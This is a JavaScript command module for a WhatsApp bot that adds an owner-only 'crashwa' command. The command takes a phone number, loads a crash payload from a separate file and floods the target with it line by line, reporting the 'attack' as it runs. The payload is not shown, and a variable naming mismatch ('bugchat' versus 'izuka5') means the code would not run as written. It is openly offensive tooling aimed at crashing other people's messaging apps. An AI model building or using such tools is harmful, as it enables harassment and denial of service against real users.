const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../../bug/izuka5.js');
cmd({
  pattern: 'crashwa',
  desc: 'Owner-only command to send WhatsApp crash payload to target',
  category: 'bug',
  react: '💣',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowedUsers = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')
    ];
    const protectedNumbers = ['13058962443'];

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'crashwa') return;

    if (!allowedUsers.includes(senderId)) {
      return await bot.sendMessage(from, { text: '*🚫 This is an owner-only command.*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}crashwa <number>`
      }, { quoted: mek });
    }

    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Attack blocked.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const crashLines = izuka5.split('\n').filter(Boolean);

    await bot.sendMessage(from, {
      text: `💣 *CRASHWA Attack Initiated*\n📱 Target: +${targetNumber}\n📦 Payload: ${crashLines.length} lines\n\n⚠️ Wait while the attack is sent...`
    }, { quoted: mek });

    for (let i = 0; i < crashLines.length; i++) {
      await bot.sendMessage(targetJid, {
        text: `💥 *CRASHWA PACKET #${i + 1}*\n${crashLines[i]}\n\n💣 _INCONNU-XD CRASHWA ENGINE_`
      });
      await new Promise(r => setTimeout(r, 250));
    }

    await bot.sendMessage(from, {
      text: `✅ *CRASHWA attack completed successfully on* +${targetNumber}.`
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
